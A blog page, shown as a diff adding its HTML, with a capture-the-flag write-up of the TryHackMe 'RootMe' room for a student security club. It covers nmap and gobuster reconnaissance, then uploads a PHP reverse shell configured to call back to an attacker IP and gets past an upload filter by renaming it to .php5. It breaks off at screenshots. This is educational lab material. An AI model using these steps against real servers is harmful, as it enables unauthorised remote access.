@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The only thing I know is that I know nothing. - Socrates">
+    <meta name="Author" content="James Masara">
+    <meta name="keywords" content="I am masara">
+    <link rel="stylesheet" href=https://masarajames.github.io/css/syntax.css>
+    <link rel="stylesheet" href=https://masarajames.github.io/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <link rel="icon" type="image/jpeg" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPG2qPkTre5rqn8v_pjBn2-nHkuweOMB6k4Q"/>
+    <title>This is Masara</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+       <a href="https://masarajames.github.io/"> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGU2qOgMbJac2bsZiV3KNPpNYUyKB-_9ooqj7LVcJHzpbe_AJGB8Z1JmPr0CEMwqPByA8" alt="Avatar"></a>
+        
+    
+
+    <a id="branding" href=https://masarajames.github.io>
+        
+            Masara
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>Home</span>
+            </a>
+        
+            		
+            <a href="/about/"
+                
+            >
+                <i class="fas fa-user fa-ms"></i>
+                <span>About Me</span>
+            </a>
+        
+            		
+            <a href="/blog"
+                
+            >
+                <i class="fas fa-flag-checkered fa-ms"></i>
+                <span>Blogs</span>
+            </a>
+        
+            		
+            <a href="/ctf/"
+                
+            >
+                <i class="fas fa-building fa-ms"></i>
+                <span>CTF</span>
+            </a>
+        
+            		
+            <a href="/notes"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>My notes</span>
+            </a>
+        
+            		
+            <a href="https://github.com/masarajames"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/contact"
+                
+            >
+                <i class="far fa-envelope"></i>
+                <span>contact</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">RootMe </h1>
+    
+      
+    
+    <p>As part of the weekly session at <a href="https://twitter.com/CyberKimathi">Cyber Security club of Kimathi</a>, we did this room from  <a href="https://tryhackme.com">Tryhackme</a>. I have written a very well explained write-up of the room to help our members understand the room deeply.</p>
+<p>The room is called <a href="https://tryhackme.com/r/rroom/rootme">RootMe</a>.It is simple level ctf that will help you learn about <em>nmap, GoBuster, privilege escalation, SUID, find, webshell, and gtfobins.</em></p>
+<h2 id="task-1">Task 1</h2>
+<blockquote>
+<p><em><strong>Remember to connect to your <a href="https://tryhackme.com/r/room/openvpn">openVPN</a>.For you to scan locally in your machine without using the attackbox</strong></em></p>
+</blockquote>
+<h2 id="task-2">Task 2</h2>
+<h4 id="reconnaissance">Reconnaissance</h4>
+<p>Once you have started the machine,you will be given an IP.I was given an IP of <em>10.10.153.177</em> . I first did an nmap scan at the IP</p>
+<pre><code>nmap -A -sV -sC -T4 10.10.153.177
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-28 22:45 EAT
+Warning: 10.10.153.177 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.153.177
+Host is up (0.24s latency).
+Not shown: 991 closed ports
+PORT      STATE    SERVICE          VERSION
+22/tcp    open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp    open     http             Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: HackIT - Home
+3269/tcp  filtered globalcatLDAPssl
+3476/tcp  filtered nppmp
+3546/tcp  filtered unknown
+3689/tcp  filtered rendezvous
+3971/tcp  filtered lanrevserver
+19315/tcp filtered keyshadow
+57797/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 118.05 seconds
+</code></pre>
+<p>This results helped me answer the first 3 questions.</p>
+<blockquote>
+<p>Scan the machine, how many ports are open?</p>
+<ul>
+<li><code>2</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>What version of Apache is running?</p>
+<ul>
+<li>2.4.29</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>What service is running on port 22?</p>
+</blockquote>
+<p>I then used gobuster to do a directory scan of the IP</p>
+<pre><code>gobuster -u  10.10.153.177 -w /usr/share/dirb/wordlists/common.txt
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.215.169/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/panel (Status: 301)
+/server-status (Status: 403)
+/uploads (Status: 301)
+=====================================================
+=====================================================
+</code></pre>
+<p>This helped me answer next question. From the list of directories i found , the directory that could potential be hidden could be the <em><strong>panel</strong></em> or <em><strong>uploads</strong></em> directory but got it was <strong>panels</strong></p>
+<blockquote>
+<p>What is the hidden directory?</p>
+<ul>
+<li>/panel/</li>
+</ul>
+</blockquote>
+<h2 id="task-3">Task 3</h2>
+<h4 id="getting-a-shell">Getting a shell</h4>
+<p>Getting a shell on a web server typically refers to gaining unauthorized access to the server&rsquo;s operating system, usually through exploiting vulnerabilities in web applications or server configurations. Once a hacker successfully obtains a shell, they gain full control over the server, allowing them to execute commands, upload or download files, modify configurations, and potentially escalate their privileges.</p>
+<p>Once you&rsquo;ve visited  the panel <em>http://10.10.153.177/panel/</em> you will get this</p>
+<blockquote>
+<p><img src="/assets/images/rootme/1.png" alt="1"></p>
+</blockquote>
+<p>Perfect, all I needed to do was to upload a shell from this given platform.  I got a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">this commonly use php shell</a>, downloaded it to my machine.</p>
+<p>Then first changed the IP(<em><strong>IP address of your machine as the attack box</strong></em>) and port number in the shell&rsquo;s code as shown below</p>
+<pre><code>$ip = '10.18.28.29';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+</code></pre>
+<p>I then uploaded the file saved as php-reverse.php. But I got this error.</p>
+<blockquote>
+<p><img src="/assets/images/rootme/2.png" alt="2"></p>
+</blockquote>
+<p>I had to translate this, which seemed to be portugese, to english which actually meant <em>&lsquo;php is not allowed
+&lsquo;</em>
+Intersting, so had first tried other .php extension, so I renamed the script to a .php5 extension. And that uploaded successfully too</p>
+<blockquote>
+<p><img src="/assets/images/rootme/3.png" alt="3"></p>
+</blockquote>
+<p>Remember a directory called uploads, visited it and found my file there <em>http://10.10.153.177/uploads/</em></p>
+<blockquote>
+<p><img src="/assets/images/rootme/4.png" alt="3">
+<img src="/assets/images/rootme/5.png" alt="3">
+<img src="/assets/images/rootme/5.1.png" alt="3">
+<img src="/assets/images/rootme/6.png" alt="3">
+<img src="/assets/images/rootme/7.png" alt="3">
+<img src="/assets/images/rootme/8.png" alt="3">
+<img src="/assets/images/rootme/9.png" alt="3">
+<img src="/assets/images/rootme/.png" alt="3"></p>
+</blockquote>
+
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://masarajames.github.io/posts/ping_pong/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a class="grayed-out" href="javascript:void()"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">I think, therefore I am. - René Descartes</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://masarajames.github.io/js/navbutton.js></script>
+</html>
